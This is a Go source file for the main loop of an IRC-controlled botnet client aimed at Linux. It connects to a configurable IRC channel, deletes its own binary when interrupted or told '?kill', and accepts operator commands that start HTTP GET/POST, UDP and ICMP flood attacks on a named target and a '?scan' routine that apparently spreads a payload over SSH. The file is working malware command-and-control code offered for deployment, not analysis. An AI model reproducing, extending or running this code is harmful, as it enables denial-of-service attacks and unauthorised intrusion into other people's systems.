package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"os/signal"
	"runtime"
	"syscall"

	"bot/tools"
)

////////////////////////////////////////////////////////////////////////////
//                         START CONFIG HERE!!!                          //
//////////////////////////////////////////////////////////////////////////

const (
	IRC_Server        = "" //config IRC server and port here.
	IRC_Channel       = "" //config channel here //should have space!!!
	IRC_Chan_Password = "" //config channel password here.
	Payload_Name      = "" //config payload name
)

//////////////////////////////////////////////////////////////////////////
//                         STOP CONFIG HERE!!!                         //
////////////////////////////////////////////////////////////////////////

func selfDestruct() {
	os.Remove(os.Args[0])
	os.Exit(0)
}

func main() {
	if runtime.GOOS != "linux" {
		selfDestruct()
	}
	irc := tools.IRC_Conn(IRC_Server)
	tp := textproto.NewReader(bufio.NewReader(irc))
	tools.IRC_Login(irc, IRC_Channel, IRC_Chan_Password)

	sig := make(chan os.Signal)
	signal.Notify(sig,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGQUIT,
		syscall.SIGTERM,
	)

	//Inturrupt Checker
	go func() {
		<-sig
		selfDestruct()
	}()

	for {
		ircRead, err := tp.ReadLine()

		//Server signal interact
		go func() {
			if err != nil {
				selfDestruct()
			}
			if tools.IRC_Find(ircRead, "PING :") {
				tools.IRC_Send(irc, "PONG "+tools.IRC_Recv(ircRead, 1))
			}
		}()

		//Join IRC channel
		if tools.IRC_Find(ircRead, "+iwx") || tools.IRC_Find(ircRead, "+i") ||
			tools.IRC_Find(ircRead, "+w") || tools.IRC_Find(ircRead, "+x") {
			tools.IRC_Send(irc, fmt.Sprint("JOIN "+IRC_Channel+IRC_Chan_Password))
		}

		//Check bot herder commands
		go func() {
			if tools.IRC_Find(ircRead, "?get") {
				tools.DDoS_Switch = false
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START HTTP GET FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.GET(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?post") {
				tools.DDoS_Switch = false
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START HTTP POST FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.POST(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?udp") {
				tools.DDoS_Switch = false
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START UDP FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.UDP(tools.IRC_Recv(ircRead, 4), tools.IRC_Recv(ircRead, 5), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?icmp") {
				tools.DDoS_Switch = false
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START ICMP FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.ICMP(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?scan") {
				tools.Scan_Switch = false
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START SCANNING.")
				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
			} else if tools.IRC_Find(ircRead, "?kill") {
				selfDestruct()
			} else if tools.IRC_Find(ircRead, "?stop.ddos") {
				tools.DDoS_Switch = true
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :STOP ATTACKING.")
			} else if tools.IRC_Find(ircRead, "?stop.scan") {
				tools.Scan_Switch = true
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :STOP SCANNING.")
			}
		}()
	}
}
